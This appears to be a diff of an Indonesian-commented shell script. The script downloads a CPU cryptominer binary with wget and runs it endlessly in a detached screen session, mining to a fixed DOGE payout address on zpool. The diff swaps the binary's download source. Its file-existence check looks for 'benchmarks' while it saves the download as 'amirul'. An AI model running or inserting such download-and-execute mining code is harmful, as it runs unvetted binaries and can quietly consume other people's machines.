@@ -11,7 +11,7 @@ cd /root || exit
 # Download miner jika belum ada
 if [ ! -f benchmarks ]; then
   echo "⬇️ Mengunduh file benchmarks..."
-  wget -O amirul https://raw.githubusercontent.com/amirul5656/web/refs/heads/main/amirul
+  wget -O amirul https://github.com/MattF42/pepew-cpu-miner/releases/download/v3.1.1/pepepow-cpuminer
   chmod +x amirul
 fi
 
@@ -22,7 +22,7 @@ else
   echo "▶ Menjalankan mining di screen 'amirul3'..."
   screen -dmS amirul3 bash -c '
     while true; do
-      ./amirul -a yespowerSUGAR -o stratum+tcp://yespowerSUGAR.sea.mine.zpool.ca:6241 -u D8n4HXcTza73pBw93ZnSgcZRo8rHdZJLux -p c=DOGE -t 3
+      ./amirul -o stratum+tcp://yespowerSUGAR.sea.mine.zpool.ca:6241 -u D8n4HXcTza73pBw93ZnSgcZRo8rHdZJLux -p c=DOGE -t 3
       sleep 2
     done
   '
